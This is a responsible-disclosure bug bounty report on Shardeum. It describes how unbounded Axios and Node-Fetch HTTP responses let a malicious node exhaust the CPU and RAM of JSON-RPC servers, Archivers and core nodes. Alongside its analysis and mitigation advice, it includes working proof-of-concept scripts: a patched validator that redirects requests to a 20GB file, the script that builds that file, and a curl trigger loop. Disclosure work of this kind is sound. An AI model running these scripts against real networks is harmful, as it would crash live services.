# 34053 - \[BC - Critical] Malicious HTTP responses allow systemic applica...

## Malicious HTTP responses allow systemic application level denial-of-service attack against multiple Shardeum components

Submitted on Aug 5th 2024 at 01:25:02 UTC by @rootrescue for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34053

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://immunefi.com>

Impacts:

* Hey team! As discussed on Discord, this bundled report includes systemic application level Denial-of-Service vulnerabilities mainly touching Shardeum Core nodes, Archivers and JSON-RPC services as "Primacy-of-Impact" rather than opening individual reports.
* Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
* RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer

### Description

### Preword

Hey team! As discussed on Ancillaries Discord channel, this report is a bundled set of systemic vulnerabilities touching components from both Shardeum: Core boost as well as Shardeum: Ancillaries boost reported with "Primacy-of-Impact" rather than opening individual reports for each affected repository to ease your teams internal discussion around the root cause of the issue.

The section for "Impact, likelihood & severity" outlines individual "Immunefi scale" impact and severity for each component respectively. In total, this report contains details for 5 individual in-scope components: Core nodes, Archiver service, JSON-RPC service, Explorer server and Relayer collector. Severity of the identified issue ranges from low to high (even critical..?) depending on the affected component.

### Intro

A systemic issue across Shardeum code bases allow an attacker to perform varying severity of application level denial-of-service attacks against Shardeum consensus nodes, Archiver server, and JSON-RPC server. This issue arises as components across repositories do not enable proper safeguards when performing external HTTP API calls and accepts arbitrary HTTP responses returned from the external calls. The attacker can deploy modified components, such as a consensus node, force or wait the targeted service to connect to it and make the received HTTP API call return a very large or a very slow response (directly or by redirecting it to a 3rd-party service), which will consume varying levels of computer resources from the target.

The impact effects range between full CPU, RAM and network bandwidth consumption leading to undefined behaviour and application crashes, to exhausting targeted services download bandwidth and/or available connection threads.

### Vulnerability Details

The Shardeum components utilize three different libraries to manage external HTTP requests:

* Axios
* Node-Fetch
* Got

The used Axios library defaults are lacking safeguards against malicious request manipulation, namely it does not restrict accepted response sizes, does not introduce request round-trip timeouts and follows arbitrary redirect responses. Practically ALL Axios utilizing down stream HTTP request calls are vulnerable with only individual exceptions. Axios will attempt to read and parse all data from the response, storing it in systems RAM until it's exhausted. At the same time, the system does not limit the download speed of the data and parsing will use excessive amounts of CPU cycles for the affected thread.

Similarly, the used Node-Fetch library is vulnerable to arbitrary response sizes, is lacking RTT timeouts and follows arbitrary redirects. Difference between Axios and Node-Fetch is, that Node-Fetch will ignore the data itself if it's too large, but will not close the connection and continues to download the response data at full capacity until the stream is closed. Worth noting, that if the targeted service opens more than one exploiting connection at once, Node-Fetch too can exhaust all CPU and RAM of the target.

The vulnerability can be exploited with two methods:

* By actively initiating an API call to a vulnerable component, which will trigger an external call to the attacker controlled malicious service responding with non-expected data
  * For example: Transaction injects, block queries, transaction debugs
* By passively listening for and answering to any external calls initiated by a vulnerable component and responding with non-expected response or data
  * For example components querying for: node information, known archivers, node lists, network configs

Of the used libraries, only Got is assessed NOT to be vulnerable to malicious arbitrary responses by default.

#### Per component

NOTE: This will be non-exhaustive listing of locations and actions using vulnerable libraries as there are a lot of them, but I'll provide my best attempt to cover everything.

**JSON-RPC**

JSON-RPC service has it worst of all components assessed. JSON-RPC service uses only Axios. Either directly, or abstracted away in `axiosWithRetry`, `requestWithRetry` and other single purpose methods.

JSON-RPC service initiated requests with Axios:

```
- GET /account/[accountId]
- GET /api/log
- GET /api/originalTx
- GET /api/transaction
- GET /api/receipt
- GET /api/blocks
- GET /api/v2/logs
- GET /archivers
- GET /cycleinfo/[ID]
- GET /faucet-claims/count
- GET /full-nodelist?activeOnly=[true|false]
- GET /eth_gasPrice
- GET /eth_blockNumber
- GET /eth_getBlockByNumber
- GET /eth_getBlockByHash
- GET /eth_getCode
- GET /nodeinfo
- GET /transaction
- GET /tx/[txId]
- POST /contract/accesslist
- POST /contract/estimateGas
- POST /contract/call
- POST /inject
```

Limiting factors: Not many. JSON-RPC service often calls other known components within the network in randomized manner and the attacker can trigger the external call on-demand. Worst situation of the assessed components - any external call is a potential source for full application level Denial-of-Service attack.

**Archiver**

Archive server uses primarly Node-Fetch and Got, with exception of Axios within configuration update scripts. The Node-Fetch is used directly and via exports introduced in ./src/P2P.ts and ./src/sync-v2/queries.ts:

```
./src/sync-v2/queries.ts:
function makeRobustQueryCall
function attemptSimpleFetch
export function robustQueryForCycleRecordHash
export function robustQueryForValidatorListHash
export function robustQueryForArchiverListHash
export function robustQueryForStandbyNodeListHash
export function getCurrentCycleDataFromNode
export function getValidatorListFromNode
export function getArchiverListFromNode
export function getStandbyNodeListFromNode

./src/P2P.ts
export async function getJson
export async function postJson
```

Archiver initiated requests with Node-Fetch:

```
- GET /netconfig
- GET /sync-newest-cycle
- GET /nodeinfo
- GET /nodelist
- GET /cycleinfo/[ID]
- GET /standby-list
- GET /validator-list
- GET /cycle-by-marker
- GET /standby-list-hash
- GET /archiver-list-hash
- GET /current-cycle-hash
- GET /validator-list-hash
- GET /leavingarchivers
- GET /activearchiver
- GET /statehashes
- GET /joinedArchiver/[publicKey]
- GET /genesis_accounts?start=[startAccount]
- GET /get-network-account?hash=[true|false]
- POST /joinarchiver
- POST /requestdata
- POST /cycleinfo
- POST /lost-archiver-refute
- POST /querydata
- POST /gossip
- POST /get-tx-receipt
- POST /originalTx
- POST /receipt
- POST /get_globalaccountreport_archiver
- POST /cycleinfo
- POST /account
- POST /transaction
- POST /totalData
```

Limiting factors: Not many. Archivers periodically call other known components within the network, for example the /netconfig endpoint on core ndoes. While the Node-Fetch will not exhaust CPU or RAM initially, filling the download bandwidth and available networking threads can lead to nasty consequences too. If the target can be successfully made to make more connections to the exploit server, the attack can consume all CPU and RAM and crash the service similarly to Axios.

**Shardeum Core nodes**

Shardeum nodes primarly uses Got library to perform external requests. Core nodes use Axios library with possibility of triggering the vulnearbility during node startup, network joins and certificate manipulations. The Axios requests target both Archivers and Consensus nodes providing avenue of exploitation using described passive method. Core nodes startups archiver discovery also utilizes lib-archiver-discovery, which uses Axios in a vulnerable way.

Shardeum repository has a dedicated utility for Axios requests located at ./src/utils/requests.ts, which exports vulnerable request methods:

```
./src/utils/requests.ts
export const shardusGet
export const shardusPost
export const shardusPut
export const shardusGetFromNode
export const shardusPostToNode
export const shardusPutToNode
```

Core node initiated requests with Axios:

```
- GET /account/[address]
- GET /api/account?accountId=[accountId]&blockNumber=[blockNrHex]
- GET /archivers
- GET /get-network-account?hash=[true|false]
- PUT /query-certificate
- POST /inject
```

Limiting factors:

* During the startup, the Archivers to be connected should be setup in the archivers-config.json and have probably more trust upon them than other, permissionless network components.
* Certificate query doesn't appear to be triggered very often. Receiving the request with malicious node can be hard.
* Network account is often (not neccessarily always) fetched from one of these "trusted" archivers, lowering the probability of successful exploitation by a bad actor.

**Explorer server**

Explorer uses Axios via `queryFromDistributor` and `fetcher` methods:

queryFromDistributor:

```
- POST /cycleinfo
- POST /receipt
- POST /originalTx
- POST /account
- POST /transaction
- POST /totalData
```

fetcher is used in the frontend components.

Limiting factors: Distributor should probably be considered to be a trusted component.

**Relay Collector**

Relay Collector uses Axios via `queryFromDistributor` method for the following queries:

```
- POST /cycleinfo
- POST /receipt
- POST /originalTx
- POST /account
- POST /transaction
- POST /totalData
```

Limiting factors: Distributor should probably be considered to be a trusted component.

### Impact, likelihood & severity

#### Per used library

Node-Fetch:

* Utilizing download bandwidth as fast as the system can fetch data
* Locking networking threads, one per exploitation attempt
* If more connections are opened at the same time:
  * Exhausting CPU and RAM
  * Application crashes

Axios:

* Exhausting CPU and RAM
* Application crashes
* Utilizing download bandwidth as fast as the system can fetch data
* Locking networking threads, one per exploitation attempt

Overall, if exploited, the attack can lead to significant network wide issues of excessive resources consumption and application crashes.

#### Per component

**JSON-RPC service**

As the JSON-RPC service is using exclusively Axios, it has the worst impact of the bunch: complete, on-demand denial-of-service initiable by the attacker. Successful attack leads to full RAM utilization, application crashes and undefined behaviour.

Immunefi scale:

* Impact: High, Taking down the application/website
* Likelihood: Critical, the attacker can execute the attack on-demand
* Severity: High

**Archiver service**

While using Node-Fetch initiated requests, the attacker can capture the request and redirect it to an external data stream. The node will use unneccessary amounts of download bandwidth while the attacker can make some unfortunate 3rd-party to do the heavy lifting of serving it.

Additionally to the streaming approach, the attacker may choose to utilize Slow-Denial-of-Service method, where the connection is opened and kept alive, slowly dripping bytes of data to the target node. By opening opening and never closing connections the attacker can exhaust available networking threads of the target component.

If the attacker can keep open multiple connections at once, the Archive server will be overwhelmed and exhausted of all CPU and RAM, leading to undefined behaviour.

Immunefi scale:

* Impact: High, Taking down the application/website
* Likelihood: High, an attacker with synced node has a possibility perform the attack against multiple archiver services
* Severity: High

**Core nodes**

Exploiting Axios requests on core nodes is technically possible, but in real world scenario would probably require the node to connect to untrusted archiver, of which likelihood can be assessed to be low. Additionally, the vulnerable certificate query is limited in a similar way: only few nodes at a time receive the request. However, if the node connects to a untrusted archiver or node with Axios, it becomes vulnerable of RAM exhaustion and crashes.

Immunefi scale:

* Impact: Medium, Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
* Likelihood: Low, attacker needs to get lucky, but can be assessed to happen eventually?
* Severity: Medium

**Explorer server & Relayer collector**

Can be exploited similarly to core nodes and archiver server, if for some reason the distributor service is untrusted.

Immunefi scale:

* Impact: High, Taking down the application/website
* Likelihood: Low, the attack would require the victim to connect to untrusted distributor service
* Severity: Low

### References

Axios documentation, request config defaults: <https://axios-http.com/docs/req\\_config> Slow Denial-of-Service attack: <https://en.wikipedia.org/wiki/Slow\\_DoS\\_attack>

### A case study: JSON-RPC Denial-of-Service

The JSON-RPC Service utilizes Axios HTTP request library to make requests to other resources within the Shardeum ecosystem. The used Axios instance is lacking safeguards against malicious request manipulation, namely it does not restrict the response sizes, does not introduce request round-trip timeouts and follows arbitrary redirect responses. Practically ALL Axios utilizing down stream HTTP/API request calls are vulnerable.

The vulnerability can be exploited at least in two ways:

* Force a public JSON-RPC service to connect to a malicious consensus node via direct API calls
* Trap an arbitrary incoming API call with a malicious consensus node coming from a non-public JSON-RPC service

The JSON-RPC service can be made to trigger an external API call to a random consensus node by many of its normal RPC-endpoints. For easy demonstration of the attack flow, let's consider “eth\_getBlockByHash” JSON-RPC endpoint as an example of this. The code can be found from json-rpc-server/src/api.ts L#2095:

```
eth_getBlockByHash: async function (args: RequestParamsLike, callback: JSONRPCCallbackTypePlain) {
  const api_name = 'eth_getBlockByHash'
  nestedCountersInstance.countEvent('endpoint', api_name)
  if (!ensureArrayArgs(args, callback)) {
    countFailedResponse(api_name, 'Invalid params: non-array args')
    return
  }
  const ticket = crypto
    .createHash('sha1')
    .update(api_name + Math.random() + Date.now())
    .digest('hex')
  logEventEmitter.emit('fn_start', ticket, api_name, performance.now())
  /* prettier-ignore */ if (firstLineLogs) { console.log('Running getBlockByHash', args) }
  let result: readableBlock | null = null
  //getCurrentBlock handles errors, no try catch needed
  result = await collectorAPI.getBlock(args[0], 'hash', args[1])
  if (!result) {
    // since there are no transactions included when we query from validator,
    // the transaction_detail_flag is not used
    const res = await requestWithRetry(RequestMethod.Get, `/eth_getBlockByHash?blockHash=${args[0]}`)
    result = res.data.block
  }

  logEventEmitter.emit('fn_end', ticket, { success: true }, performance.now())
  callback(null, result)
  countSuccessResponse(api_name, 'success', 'TBD')
},
```

The “eth\_getBlockByHash” first attempts to query the collector API for a block hash. If the query is made with a non-existing block hash, the collector will return null, which will trigger the JSON-RPC service to attempt retrieve the block from consensus nodes utilizing “requestWithRetry()” function (json-rpc-server/src/api.ts L#:272):

```
export async function requestWithRetry(
  method: RequestMethod,
  route: string,
  data: object = {},
  nRetry = config.defaultRequestRetry,
  isFullUrl = false,
  responseCheck: (data: any) => boolean = () => true
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
): Promise<any> {
  let retry = 0
  const IS_INFINITY: boolean = nRetry < 0
  const maxRetry = nRetry //set this to 0 with for load testing rpc server

  let nodeUrl
  while (retry <= maxRetry || IS_INFINITY) {
    retry++
    let url
    let nodeIpPort
    let nodeUrl
    if (!isFullUrl) {
      const urlInfo = getBaseUrl()
      nodeUrl = urlInfo.baseUrl
      nodeIpPort = urlInfo.nodeIpPort
      url = `${nodeUrl}${route}`
    } else {
      url = route
    }
    const timeout = getTimeout(route)
    try {
      if (verboseRequestWithRetry && verbose) console.log(`timeout for ${route} is ${timeout}`)
      const queryStartTime = Date.now()
      const res = await axios({
        method,
        url,
        data,
        timeout,
      })
      
[SNIPPED FOR READABILITY]
```

The "requestWithRetry()", when receiveing partial target URL will call “getBaseUrl()” function on L#292, which by default is effectively a rotating node entry fetched from the known consensus nodes list. After fetching the target consensus node to make the API call, the code proceeds to make the HTTP request with Axios library at L#303.

NOTE: While the code passes default timeout parameter of 2000ms to Axios, this timeout is only triggered if the target consensus node does not respond at all. It is not considered after successful connection.

By making consequent calls to the JSON-RPC Service the attacker can rotate through the list of known consensus nodes to initiate the exploitable connection. In case the JSON-RPC Service is not publicly available, the attack is still possible, as the “requestWithRetry()” and other Axios utilizing functions call different ecosystem components for example during transaction injection.

The bottom line is: almost all queries made to any component of the ecosystem are vulnerable to this kind of an attack if the receiving component is controlled by an attacker AND the external request is made using Axios or Node-Fetch library.

#### A case study: Impact Details

Application level Denial-of-Service of all JSON-RPC services. The attack has cascading effects: when the OS userland is running out of RAM, the swap memory will significantly slow down all userland processes, making it possible for other processes to crash, or come unresponsive for long enough to be deemed lost and/or monitoring software issuing resets. If the service is ran with root privileges, the operating system will crash. Even if the targeted service itself wouldn't initially crash, the NodeJS garbage collector fails to release the memory leading to full RAM utilization.

Additionally, during the exploits RAM build-up, the service will download data as fast as it can from the exploit server, providing secondary effect on the resource consumption. Downloading large amounts of data can have additional effects, such as high VPS billings costs or create volumetric denial-of-service state or slowing down actual legitimate responses made to the service.

### Mitigation

In its current state, the Shardeum repositories utilize at least three different HTTP request libraries: Got, Node-Fetch and Axios. I'd advice to create and configure a single module-type component and refactor the code to handle all external HTTP requests calls using the new hardened module. A single module is easier to secure against exploitation and generates more readable and stable code as well as removes duplicate dependencies.

To be used in a permissionless setting, the configured module should at least:

* Limit the total request times to a suitable amount of time relevant to the call
* Limit the maximum response content length
* Limit the exposure to HTTP redirects
* Validate the response to be of exact type of data requested

Of course the mitigation should be made as relevant as possible to the codebase, as you'll have way more initimate insight of the overall code than us hunters.

## Proof of Concept: JSON-RPC Axios Denial-of-Service attack

#### Test network setup

Setup local test network and apply the default configurations from "debug-10-nodes.patch". Follow the docs for local development installation at <https://github.com/shardeum/shardeum?tab=readme-ov-file#local-development>. Remember to also disable staking and transaction balance precheck from shardeumFlags.ts as shown in the instructions.

Start the network with for example with 9 consensus nodes (does not really matter, but low amount of nodes eases triggering the vulnerability later on). This should start Archiver, Monitor and 9 consensus nodes.

```
shardus start 9
```

Setup and install target JSON-RPC service and start it. <https://github.com/shardeum/json-rpc-server?tab=readme-ov-file#developer-environment-setup>

Setup and start Relay-Collector and Relay-Distributor services if you want the full experience (won't be utilized).

#### Exploit node setup

In a separate directory, we'll create the exploit node. This includes repositories for shardus-core, shardeum and validator-cli. Setup the directory environment and apply exploit patches with the following script (remember to setup address variable for the exploit server). If you do not want to host the exploit server and file yourself, you can probably utilize 3rd-party download speed testing sites / files for an individual test case.

NOTE: I've tested the script from scratch on Debian 12 VM, but your mileage may vary depending on the box, as it's rather complex set of different components. If for some reason the script fails to deliver, you can just extract the patches from the echo lines and setup manually. If it totally fails, let me know to debug it.

NOTE: In the following script, setup the EXPLOIT\_SERVER\_ADDR to confrom with our environment!

```
#!/bin/bash

# BEFORE EXECUTING, SETUP EXPLOIT_SERVER_ADDR
EXPLOIT_SERVER_ADDR=http://192.168.0.100:8000/huge.json
echo "Set Exploit Server as $EXPLOIT_SERVER_ADDR"

# Setup directories, repositories and links
echo "Creating directory structure and cloning repositories..."
mkdir exploit_test
cd exploit_test
git clone https://github.com/shardeum/shardus-core
git clone https://github.com/shardeum/shardeum
git clone https://github.com/shardeum/validator-cli
ln -s shardeum validator

# Install, patch and compile shardus-core
echo "Setting up shardus-core..."
cd shardus-core

echo "diff --git a/src/network/index.ts b/src/network/index.ts
index ec6f9ad2..e95e9b27 100644
--- a/src/network/index.ts
+++ b/src/network/index.ts
@@ -108,6 +108,8 @@ export class NetworkClass extends EventEmitter {
   }
 
   customSendJsonMiddleware(req, res, next) {
+    // MODIFIED, commenting this prevents node crash upon attempting to set already sent headers
+    /*
     const originalSend = res.send;
     res.send = function (data) {
       if (typeof data === 'object' && data !== null) {
@@ -123,7 +125,7 @@ export class NetworkClass extends EventEmitter {
       res.setHeader('Content-Type', 'application/json')
       return originalSend.call(this, jsonString)
     }
-
+    */
     next()
   }
" > shardus-core_exploit.patch

git apply shardus-core_exploit.patch

npm i

npm run build:dev

# Install, patch and compile shardeum
echo "Setting up shardeum..."
cd ../shardeum

# Create patch (includes debug-10-nodes.patch)
echo "diff --git a/config.json b/config.json
index a3dacc5..5316cbb 100644
--- a/config.json
+++ b/config.json
@@ -12,9 +12,9 @@
     },
     \"ip\": {
       \"externalIp\": \"127.0.0.1\",
-      \"externalPort\": 9001,
+      \"externalPort\": 9031,
       \"internalIp\": \"127.0.0.1\",
-      \"internalPort\": 10001
+      \"internalPort\": 10031
     },
     \"reporting\": {
       \"report\": true,
diff --git a/package.json b/package.json
index 0549484..436c21a 100644
--- a/package.json
+++ b/package.json
@@ -45,7 +45,7 @@
     \"@ethereumjs/vm\": \"7.0.0\",
     \"@mapbox/node-pre-gyp\": \"1.0.10\",
     \"@shardus/archiver-discovery\": \"1.1.0\",
-    \"@shardus/core\": \"2.12.30-57\",
+    \"@shardus/core\": \"../shardus-core\",
     \"@shardus/crypto-utils\": \"4.1.3\",
     \"@shardus/net\": \"1.3.15\",
     \"@shardus/types\": \"1.2.13\",
diff --git a/src/config/index.ts b/src/config/index.ts
index 665bb88..4f77dbf 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -132,8 +132,8 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 300, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 300,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
       maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1100,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
@@ -146,7 +146,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -306,11 +306,11 @@ config = merge(
   config,
   {
     server: {
-      mode: 'release', // todo: must set this to \"release\" for public networks or get security on endpoints. use \"debug\"
+      mode: 'debug', // todo: must set this to \"release\" for public networks or get security on endpoints. use \"debug\"
       // for easier debugging
       debug: {
-        startInFatalsLogMode: true, // true setting good for big aws test with nodes joining under stress.
-        startInErrorLogMode: false,
+        startInFatalsLogMode: false, // true setting good for big aws test with nodes joining under stress.
+        startInErrorLogMode: true,
         robustQueryDebug: false,
         fakeNetworkDelay: 0,
         disableSnapshots: true, // do not check in if set to false
diff --git a/src/index.ts b/src/index.ts
index e65a20d..44a5eec 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -1327,7 +1327,9 @@ const configShardusEndpoints = (): void => {
       return res.json({ error: 'Invalid block hash' })
     if (ShardeumFlags.VerboseLogs) console.log('Req: eth_getBlockByHash', blockHash)
     const blockNumber = blocksByHash[blockHash]
-    return res.json({ block: readableBlocks[blockNumber] })
+    // return res.json({ block: readableBlocks[blockNumber] })
+    // MODIFIED
+    return res.redirect('$EXPLOIT_SERVER_ADDR')
     /* eslint-enable security/detect-object-injection */
   })
 
diff --git a/src/shardeum/shardeumFlags.ts b/src/shardeum/shardeumFlags.ts
index ac80e04..31311ea 100644
--- a/src/shardeum/shardeumFlags.ts
+++ b/src/shardeum/shardeumFlags.ts
@@ -143,7 +143,7 @@ export const ShardeumFlags: ShardeumFlags = {
   DebugRestoreArchiveBatch: 2000,
   CheckNonce: true,
   txNoncePreCheck: false,
-  txBalancePreCheck: true,
+  txBalancePreCheck: false,
   autoGenerateAccessList: true,
   forwardGenesisAccounts: true,
   UseDBForAccounts: true,
@@ -176,7 +176,7 @@ export const ShardeumFlags: ShardeumFlags = {
     ['tx/:hash']: 5,
   },
   generateMemoryPatternData: true,
-  StakingEnabled: true,
+  StakingEnabled: false,
   ModeEnabled: true,
   AdminCertEnabled: false,
   minActiveNodesForStaking: 5,
" > shardeum_exploit.patch

git apply shardeum_exploit.patch

npm i

npm run prepare

# Install, patch, compile and run validator-cli
echo "\nSetting up validator-cli..."
cd ../validator-cli

# Removes default Archivers list and appends 127.0.0.1 with default dev public key
echo "diff --git a/src/config/default-network-config.ts b/src/config/default-network-config.ts
index 15e59d7..eea8506 100644
--- a/src/config/default-network-config.ts
+++ b/src/config/default-network-config.ts
@@ -4,30 +4,18 @@ export const defaultNetworkConfig = {
     p2p: {
       existingArchivers: [
         {
-          ip: '45.79.16.146',
+          ip: '127.0.0.1',
           port: 4000,
           publicKey:
-            '840e7b59a95d3c5f5044f4bc62ab9fa94bc107d391001141410983502e3cde63',
-        },
-        {
-          ip: '45.56.92.103',
-          port: 4000,
-          publicKey:
-            '2db7c949632d26b87d7e7a5a4ad41c306f63ee972655121a37c5e4f52b00a542',
-        },
-        {
-          ip: '170.187.134.16',
-          port: 4000,
-          publicKey:
-            '7af699dd711074eb96a8d1103e32b589e511613ebb0c6a789a9e8791b2b05f34',
+            '758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3',
         },
       ],
     },
     ip: {
       externalIp: '127.0.0.1',
-      externalPort: 9001,
+      externalPort: 9031,
       internalIp: '127.0.0.1',
-      internalPort: 10001,
+      internalPort: 10031,
     },
     reporting: {
       report: true,
" > validator-cli_exploit.patch

git apply validator-cli_exploit.patch

npm ci && npm link

chmod +x ~/.nvm/versions/node/v18.16.1/bin/operator-cli

operator-cli start # Or: pm2 start validator

echo "All done, exploit validator should be starting up!"
```

#### Exploit file and server setup

Preferably, on a separate workstation or VM, prepare and run the exploit server and exploit file:

```
#!/bin/bash

# Create a large JSON file. The file size should be more than the amount of available RAM on the target system. This script will create approx 20GB JSON file.
echo 'Creating huge.json'
echo '[' > huge.json

for i in {1..10000000}; do
    echo '{"TESTTESTTESTTESTESTTEST":"TESTTESTTESTTESTTESTTEST"},' >> temp.json;
done

for i in {1..40}; do
    cat temp.json >> huge.json
done

rm temp.json

echo ']' >> huge.json

echo 'DONE'
```

Serve the JSON file with a simple Python server:

```
python3 -m http.server 8000
```

#### Exploit trigger

Once the epxloit node is synced to the network, run the exploit proof-of-concept script to trigger the vulnerability. Remember to setup your JSON-RPC address in the script below:

```
#!/bin/bash

# This script will just curls the JSON-RPC endpoint 20 times and passes all output to /dev/null
# Modify the script to accomodate the JSON-RPC service address

JSON_RPC_ADDR='http://192.168.0.10:8080'

for i in {1..20}; do
    curl -i -X POST $JSON_RPC_ADDR -H 'Content-Type: application/json' --data '{"jsonrpc":"2.0","method":"eth_getBlockByHash","params":["0x58407531dc8899e79c8c80d7cb886349ededc3f03b2730a5d20ff6fcc7199e3d"],"id":1}' 2&>1 /dev/null &
done    
```

Expected end-of-output of the JSON-RPC service after successful exploitation:

```
====> Checking Health of Archivers <====
┌─────────┬─────────────────────────┬─────────────┐
│ (index) │           url           │ cycle_value │
├─────────┼─────────────────────────┼─────────────┤
│    0    │ 'http://127.0.0.1:4000' │     73      │
└─────────┴─────────────────────────┴─────────────┘
-->> 1 Healthy Archivers active in the Network <<--
Current number of good nodes: 10
Updating NodeList from http://127.0.0.1:4000
nodelist_update: 1.663s
Killed
dev@shardeum:~/shardeum/json-rpc-server$
```

Also note worthy is, that during the testing, all local test networks shardeum nodes failed. This demonstrates the cascading effects which can happen if enough RAM is consumed from the target for long enough period:

```
dev@shardeum:~/shardeum/shardeum$ shardus list-net
ERROR: Cannot find a valid network-config.json file in /home/dev/shardeum/shardeum.
Checking /home/dev/shardeum/shardeum/instances...
┌─────┬────────────────────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name                       │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────────────────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 1   │ "archive-server-1"         │ default     │ 3.4.21  │ fork    │ 3562553  │ 6h     │ 0    │ online    │ 0%       │ 64.1mb   │ dev      │ disabled │
│ 2   │ "monitor-server"           │ default     │ 2.6.3   │ fork    │ 3562575  │ 6h     │ 0    │ online    │ 0%       │ 137.0mb  │ dev      │ disabled │
│ 3   │ "shardus-instance-9001"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
│ 4   │ "shardus-instance-9002"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
│ 5   │ "shardus-instance-9003"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
│ 6   │ "shardus-instance-9004"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
│ 7   │ "shardus-instance-9005"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
│ 8   │ "shardus-instance-9006"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
│ 9   │ "shardus-instance-9007"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
│ 10  │ "shardus-instance-9008"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
│ 11  │ "shardus-instance-9009"    │ default     │ 1.11.4  │ fork    │ 0        │ 0      │ 0    │ errored   │ 0%       │ 0b       │ dev      │ disabled │
└─────┴────────────────────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
```

When running the exploit proof-of-concept, the effects start to be noticable when the RAM starts to run out and the eventual crash can take anywhere from few seconds to couple of minutes, depending on the target box resources. I suggest running this against a virtual machine or you'll risk crashing the system you're using yourself. If you want to entertain yourself, try the exploit couple of times to see the full range of possible outcomes.

During the run, you can of course inspect the usage of RAM and network capacity via top or other system monitoring tool.

### Proof-of-Concept: Archiver Node-Fetch Denial-of-Service attack

If you want to test out the Node-Fetch variant of this vulnerability, apply the following patch to the shardus-core repository of the ./exploit\_test folder and compile as on JSON-RPC proof-of-concept. Before applying, set the target exploit server address in the redirect clause at the end:

```
diff --git a/src/network/index.ts b/src/network/index.ts
index ec6f9ad2..5499dca3 100644
--- a/src/network/index.ts
+++ b/src/network/index.ts
@@ -108,6 +108,8 @@ export class NetworkClass extends EventEmitter {
   }
 
   customSendJsonMiddleware(req, res, next) {
+    // MODIFIED, commenting this prevents node crash upon attempting to set already sent headers
+    /*
     const originalSend = res.send;
     res.send = function (data) {
       if (typeof data === 'object' && data !== null) {
@@ -123,7 +125,7 @@ export class NetworkClass extends EventEmitter {
       res.setHeader('Content-Type', 'application/json')
       return originalSend.call(this, jsonString)
     }
-
+    */
     next()
   }
 
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index 06184f15..779bbd28 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -2690,7 +2690,9 @@ class Shardus extends EventEmitter {
       res.send({ config: this.config })
     })
     this.network.registerExternalGet('netconfig', async (req, res) => {
-      res.send({ config: netConfig })
+      // MODIFIED
+      // res.send({ config: netConfig })
+      res.redirect('http://192.168.0.100:8000/huge.json')
     })
 
     this.network.registerExternalGet('nodeInfo', async (req, res) => {
```

### Exploit trigger

To trigger the exploit, simply start up the exploit node and let it sync. As the node introduces itself to the archiver, the archiver starts to periodically query the node for net configuration, eventually triggering the vulnerability. In this case, the 20GB file is downloaded from the exploit server after malicious HTTP redirect from the node.

During my testing, the Node-Fetch variant with single call exploit nodes `/netconfig` endpoint causes the CPU to consume approximately 40% of the capacity while memory is largely unaffected. If the Archiver makes two consequental calls to the exploit endpoint, the CPU consumption elevates to 60% while the RAM consumption explodes and exceeds the 16GB available to the VM, leading to an application crash. This attack could be significantly elevated with bigger exploit file.

For the record, the specifications for the test VM are the same as recommended by the Shardeum documentation for validators:

* 4 CPU cores
* 16GB RAM
